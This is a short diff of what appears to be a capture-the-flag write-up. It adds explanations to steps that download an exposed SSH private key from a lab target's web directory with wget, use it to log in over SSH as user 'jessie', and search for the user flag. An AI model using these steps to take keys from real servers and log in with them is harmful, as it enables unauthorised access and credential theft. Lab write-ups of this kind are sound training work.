@@ -51,13 +51,21 @@ http://10.113.186.73/sitemap/.ssh/id_rsa
 
 <img width="507" height="434" alt="image" src="https://github.com/user-attachments/assets/b845453a-d29f-4f6e-99cf-9c20b25e5aad" />
 
+Downloaded the key.
+
 `wget http://10.113.186.73/sitemap/.ssh/id_rsa`
 
+Set secure permissions so the SSH client will accept the key.
+
 `chmod 600 id_rsa`
+
+Use the private key to authenticate as user "jessie" on the target.
 
 `sudo ssh -i ~/.ssh/id_rsa jessie@10.113.186.73`
 
 <img width="717" height="264" alt="image" src="https://github.com/user-attachments/assets/3630da6b-0805-4e20-bab2-326e6d47b1af" />
+
+Сheck the home directory for the user flag.
 
 `find ~/ flag.txt`
 
